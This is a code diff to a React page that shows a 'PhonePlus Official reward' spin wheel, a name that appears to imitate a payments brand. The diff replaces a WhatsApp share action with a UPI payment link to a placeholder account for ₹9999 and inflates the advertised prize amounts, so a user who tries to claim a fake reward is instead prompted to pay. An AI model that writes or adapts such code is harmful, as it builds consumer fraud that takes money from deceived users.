@@ -40,7 +40,7 @@ export default function Page() {
 
   function openWhatsApp() {
     const message = encodeURIComponent(`PhonePlus Official reward: ${result ?? 'JACKPOT'}`)
-    window.open(`https://wa.me/?text=${message}`, '_blank', 'noopener,noreferrer')
+    window.open(`upi://pay?pa=yourvpa@bank&pn=YourBusiness&am=9999&cu=INR`, '_blank', 'noopener,noreferrer')
   }
 
   return (
@@ -78,11 +78,11 @@ export default function Page() {
             <div className="mb-5 flex items-center justify-center gap-2 rounded-full bg-[#f4e8f6] px-4 py-2 text-center font-black tracking-wide text-[#54209a]"><Gift size={19} aria-hidden="true" /> JACKPOT FUN RUPEE <Award size={19} aria-hidden="true" /></div>
             <div className="mb-4 flex justify-center gap-4 text-[#f0b928]" aria-hidden="true"><Trophy size={24} /><Banknote size={24} /><Zap size={24} /><Gift size={24} /></div>
             <div className={`wheel mx-auto ${spinning ? 'wheel-spinning' : ''}`} aria-label="Reward spinner">
-              <div className="wheel-label label-one">₹390</div>
-              <div className="wheel-label label-two">₹430</div>
-              <div className="wheel-label label-three">₹420</div>
-              <div className="wheel-label label-four">₹380</div>
-              <div className="wheel-label label-five">₹410</div>
+              <div className="wheel-label label-one">₹1390</div>
+              <div className="wheel-label label-two">₹4310</div>
+              <div className="wheel-label label-three">₹2420</div>
+              <div className="wheel-label label-four">₹3380</div>
+              <div className="wheel-label label-five">₹1410</div>
               <div className="wheel-label label-six">₹500</div>
               <div className="wheel-label label-jackpot">JACKPOT</div>
               <div className="wheel-center">SPIN</div>
